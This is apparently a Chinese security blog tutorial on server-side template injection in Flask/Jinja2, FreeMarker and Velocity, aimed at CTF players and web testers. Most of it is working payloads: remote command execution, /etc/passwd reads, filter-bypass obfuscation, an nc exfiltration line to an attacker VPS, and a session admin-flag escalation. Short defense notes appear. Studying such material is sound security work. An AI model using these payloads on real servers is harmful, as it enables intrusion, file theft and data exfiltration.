# SSTI服务端模板注入


## 简介

**ssti（Server-SIde Template Injection，服务端模板注入）**，模板引擎支持使用静态模板文件，在运行时HTML页面中的实际值替换为变量/占位符，从而让HTML的开发变得更容易。

ssti主要为python的一些框架 `jinja2 mako tornado django`，PHP框架`smarty twig`，java框架`jade velocity freeMarker XMLTemplate Smarty4j`  等等使用了渲染函数时，**由于代码不规范或信任了用户输入而导致了服务端模板注入**，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。





### Flask的Jinja2

> CTF赛题中以python下的SSTI居多



Flask是一个使用Python编写的轻量级web应用框架，其WSGI工具箱采用Werkzeug，模板引擎则使用Jinja2。


{% raw %}
基本语法，使用`{{}}`如下：

```html
<h1>Hello, {{user.name}}!</h1>
```

{% endraw %}



#### **漏洞成因：**

两种渲染给前端的代码的形式是，

1.一种当字符串来渲染并且使用了`%(request.url)`，此方法存在漏洞

```python
def test():
    template = '''
        <div class="center-content error">
            <h1>Oops! That page doesn't exist.</h1>
            <h3>%s</h3>
        </div> 
    ''' %(request.url)
```



2.另一种规范使用index.html渲染文件。

```python
@app.route('/')
@app.route('/index')#我们访问/或者/index都会跳转
def index():
   return render_template("index.html",title='Home',user=request.args.get("key"))

```

{% raw %}

由上两种功能方法，我们发现漏洞代码(第一种方法)使用了`render_template_string`函数，而如果我们使用第二种`render_template`函数，将变量传入进去，现在即使我们写成了request，我们可以在url里写自己想要的恶意代码{{}}你将会发现：即使输入参数可控了，但是代码已经并不生效。因为，良好的代码规范，使得模板其实已经固定了，已经被`render_template`渲染了。你的模板渲染其实已经不可控了。

而第一种漏洞代码的问题出在这里，如下：注意%(request.url)，有的程序员因为省事并不会专门写一个html文件，而是直接当字符串来渲染。并且request.url是可控的，这也正是flask在CTF中经常使用的手段，报错404，返回当前错误url，通常CTF的flask如果是ssti，那么八九不离十就是基于这段代码，多的就是一些过滤和一些奇奇怪怪的方法函数。


{% endraw %}


#### CTF





**内建函数：**当我们启动一个python解释器时，及时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。

`dir()`函数用于向我们展示一个对象的属性有哪些，在没有提供对象的时候，将会提供当前环境所导入的所有模块。

![](http://image.xpshuai.cn/img/image-20220120210407271.png)





python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。



`instance.__class__`可以获取当前实例的类对象



`instance.__class.____bases__`可以查看其基类



`instance.__class__.mro`获取当前类对象的所有继承类'只是这时会显示出整个继承链的关系，是一个列表，object在最底层故在列表中的最后，通过__mro__[-1]可以获取到



`subclasses()`  返回的是这个类的子类的集合。python中的类都是继承object的，所以只要调用object类对象的__subclasses__()方法就可以获取我们想要的类的对象，比如用于读取文件的file对象。

比如可以发现在第四十号指向file类，所以就可以从file类中调用open方法

```bash
''.__class__.__mro__[-1].__subclasses__()[40]("/home/xps/test/ssti/flag.txt").read()

# 这里成功利用file对象的匿名实例化，并为其传参要读取的文件名，通过调用其读文件函数read就可以对文件进行读取了
```

{% raw %}

```python
"""
# __calss__
print("".__class__)
# 返回了<class 'str'>，对于一个空字符串他已经打印了str类型

# __bases__
# 每个类都有一个bases属性，列出其基类如下
print("".__class__.__bases__)	# 打印返回(<class 'object'>,)

# mro
# 我们想要寻找object类的不仅仅只有bases，同样可以使用mro，mro给出了method resolution order，即【解析方法调用的顺序】。如下
>>> print(" ".__class__.__mro__)
(<class 'str'>, <class 'object'>)

# 正是由于这些但不仅限于这些方法，我们才有了各种沙箱逃逸的姿势
# 在flask ssti中poc中很大一部分是从object类中寻找我们可利用的类的方法。我们这里只举例最简单的。接下来我们增加代码。接下来我们使用subclasses,subclasses() 这个方法，这个方法返回的是这个类的子类的集合，也就是object类的子类的集合。
# subclasses()  返回的是这个类的子类的集合
print(" ".__class__.__bases__[0].__subclasses__())

# 需要自己寻找合适的标号来调用接下来我将进一步解释
# 接下来就是我们需要找到合适的类，然后从合适的类中寻找我们需要的方法
# 通过我们在如上这么多类中一个一个查找，找到我们可利用的类，这里举例一种。<class 'os._wrap_close'>，os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，通过大概猜测找到是第119个类，0也对应一个类，所以这里写[118]。
{{" ".__class__.__bases__[0].__subclasses__()[118]}}

# 这个时候我们便可以利用.init.globals来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数。
{{" ".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__}}

# 此时我们可以在网页上看到各种各样的参数方法函数。我们找其中一个可利用的function popen，在python2中可找file读取文件，很多可利用方法，详情可百度了解下。
{{" ".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()}}

# 此时便可以看到命令已经执行。如果是在linux系统下便可以执行其他命令。此时我们已经成功得到权限。
    
"""    
```

{% endraw %}

**执行任意命令**的payload:
```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("ls").read()') }}         # poppen的参数就是要执行的命令
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

**读取密码**

```bash
''.__class__.__mro__[-1].__subclasses__()[40]("/etc/passwd").read()
```



**命令执行:**

**1.os.system()**

```bash
用法：os.system(command)
但是用这个无法回显
```

**2.os.popen()**

我们可以用这个

用法：`os.popen(command[,mode[,bufsize]])`
说明：`mode – 模式权限可以是 ‘r’(默认) 或 ‘w’`。
popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1），可见它获取返回值的方式和os.system不同。

还需要了解一个魔法函数：`globals`，该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用

```bash
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls ").read()' )
```



**3.subprocess**

如果os被过滤了可以用subprocess

```python
1.subprocess.check_call()
Python 2.5中新增的函数。 执行指定的命令，如果执行成功则返回状态码，否则抛出异常。其功能等价于subprocess.run(…, check=True)。

2.subprocess.check_output()
Python 2.7中新增的的函数。执行指定的命令，如果执行状态码为0则返回命令执行结果，否则抛出异常。

3.subprocess.Popen(“command”)
说明：class subprocess.Popen(args, bufsize=0, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0)
Popen非常强大，支持多种参数和模式，通过其构造函数可以看到支持很多参数。但Popen函数存在缺陷在于，它是一个阻塞的方法，如果运行cmd命令时产生内容非常多，函数就容易阻塞。另一点，Popen方法也不会打印出cmd的执行信息。
```





__**init方法**

`__init__`方法用于将对象实例化，在这个函数下我们可以通过`funcglobals`（或者`__globals`）看该模块下有哪些globals函数（注意返回的是字典），而linecache可用于读取任意一个文件的某一行，而这个函数引用了os模块。

```bash
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('ls')

[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('ls')
```



**无回显处理:**

当我们用os命令执行没回显时，可以用nc把回显发到vps上:

vps:

```bash
nc -lvvp 8888
```

payload: 

```bash
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls | nc <VPS的IP> <端口号>')
```



{% raw %}

#### Bypass

**0.拼接**

```bash
object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
```



**1.过滤[]等括号**

```
使用gititem绕过。如原poc {{"".class.bases[0]}}

绕过后{{"".class.bases.getitem(0)}}
```

或者借助request对象：（这种方法在沙盒种不行，在web下才行，因为需要传参）
request变量可以访问所有已发送的参数，因此我们可以request.args.param用来检索新的paramGET参数的值,将其中的request.args改为request.values则利用post的方式进行传参

```
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd
```



**2.过滤了subclasses，拼凑法**

```
原poc
{{"".class.bases[0].subclasses()}}

绕过 
{{"".class.bases[0]['subcla'+'sses'](https://xz.aliyun.com/t/3679)}}


```



**3.过滤class**

使用session

poc 

```
{{session['cla'+'ss'].bases[0].bases[0].bases[0].bases[0].subclasses()[118]}}
```



多个bases[0]是因为一直在向上找object类。使用mro就会很方便

```
{{session['__cla'+'ss__'].__mro__[12]}}
```

或者

```
request['__cl'+'ass__'].__mro__[12]}}
```

**4.timeit姿势**

可以学习一下 2017 swpu-ctf的一道沙盒python题，

这里不详说了，博大精深，我只意会一二。



```
import timeit
timeit.timeit("__import__('os').system('dir')",number=1)

import platform
print platform.popen('dir').read()
```



**5.过滤一些函数名如`__import__`**

python的初始模块_builtin__里有很多危险的方法，一条路没了就找找其他的路
我们可以直接用 eval() exec() execfile()等

```
__builtins__.eval()
```



**6.过滤双下划线__**

request方法

```
{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read()
}}&class=__class__&mro=__mro__&subclasses=__subclasses__
```



**globals**

```
[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system('ls')
```





**收藏的一些poc**

```
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )


object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')


{{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}}
```

可以参考一下P师傅的 https://p0sec.net/index.php/archives/120/



#### 实战

每一个（重）模板引擎都有着自己的语法（点）,Payload 的构造需要针对各类模板引擎制定其不同的扫描规则, 
所以我们在挖掘之前有必要对网站的web框架进行检查，否则很多时候{{}}并没有用，导致错误判断

实战中要测试重点是看一些**url的可控**，比如url输入什么就输出什么。
**前期收集**好网站的开发语言以及框架，防止错误利用{{}}而导致错误判断。
如下图较全的反映了ssti的一些模板渲染引擎及利用：

![ssti](http://image.xpshuai.cn/img/ssti.png)




{% endraw %}






### Java的Freemarker

Freemarker模板语言(FTL)

**1.内建函数的利用**





**2.new函数的利用**

new函数可以创建一个继承自freemarker.template.TemplateModel类的实例。

查阅代码发现`freemarker.template.utility.Execute#exec`可以自行任意代码，因此可以通过new函数实例化一个Execute对象并执行exec()方法造成任意代码执行。

Payload：

```java
<#assign value="freemarker.template.utility.Execute"?new()>$(value("calc.exe"))>
```



`freemarker.template.utility`包中三个类都可以被用来执行代码：

- ObjectConstructor
- JythonRuntime
- Execute



OFCMS1.1.2版本的注入漏洞就是采用的Freemarker



**3.api函数的利用**

api函数可以用来访问java api，使用方法为：`value?api.someJavaMethod()`,相当于`value.someJavaMethod()`。因此可以利用api函数通过getClassLoader来获取一个类加载器，进而加载恶意类。也可以通过getResource来读取服务器上的资源文件

```java
<#assign classLoader=object?api.class.getClassLoader()>
    $(classLoader.loadClass("Evil.class"))
    
```





**防御：**

- 从2.3.22版本开始，api_builtin_enabled的默认值为false，这意味着api内家函数从此之后不能随意使用；
- 官方还提供了3个预定义的解析器来限制new函数对类的访问：
- USRESTRICTED_RESOLVER
- SAFER_RESOLVER
- ALLOW_NOTHING_RESOLVER







### Java的Velovity模板引擎

在Java中，Velovity使用的较多，简单介绍一下Velovity的基本语法和RCE方法。

在Velovity中，用`#`来表示Velovity的脚步语句，比如`#set`,`#if`,`#foreach`等

```jsp
#if($msg.img)
<img src=$msg.imgs border=0>
#else
<img src="a.jpg">
#end
```

`$`在Velovity中标识一个对象。根据SpEL表达式注入的知识，我们知道一旦可以调用对象，便有办法来构造命令执行语句：

```java
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null).exec()
```

在使用Velovity模板注入中，如果无法进行名住，我们可以修改Cookie来进行权限升级：

```java
$session.setAttribute("IS_ADMIN", "1")
```



在漏洞不存在回显的时候，并且容器为Tomcat7的时候，可以通过如下方法来构造一个有回显的命令执行：

```java
#set($str=$class.inspect("java.lang.String").type
#set($cstr=$class.inspect("java.lang.Character").type

#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami")
$ex.waitFor()     
#set($out=$ex.getInputStream())

#foreach(Si in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end     
```



**代码审计的时候，搜索模板引擎的相关关键字即可**











## 漏洞防御

- 避免用户能够直接控制模板的熟并对其进行过滤
- 如需要向用户公开模板编辑，则可以选择无逻辑的模板引擎，如Handlebars、Moustache等
- 





## 参考

[ssti注入 - MuRKuo - 博客园 (cnblogs.com)](https://www.cnblogs.com/murkuo/articles/14864952.html)

[SSTI（模板注入）基础总结 - 简书 (jianshu.com)](https://www.jianshu.com/p/b6f1aea3a2eb)

[SSTI/沙盒逃逸详细总结 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/188172)













---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://geoer.cn/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/  

